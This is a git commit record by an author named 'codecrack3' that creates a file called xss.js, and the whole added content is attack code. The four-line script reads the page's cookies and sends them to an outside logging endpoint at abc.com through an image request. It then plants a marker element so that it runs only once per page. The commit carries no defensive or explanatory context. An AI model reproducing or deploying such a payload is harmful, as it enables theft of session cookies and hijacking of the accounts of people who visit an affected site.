3bdc15bcb9a8ee18a0f04434c470a75f12975b9f
codecrack3 <kaisai1122@gmail.com>
2015-06-04 23:03:08 +0700

    Create xss.js

---
+++ update/xss.js
@@ -0,0 +1,4 @@
+if (document.getElementById('kaisai-1003') == null){ 
+var ck=document.cookie;
+new Image().src = 'http://abc.com/clog.php?'+ck;
+script = document.createElement('script');script.id = 'kaisai-1003'; document.body.appendChild(script); }
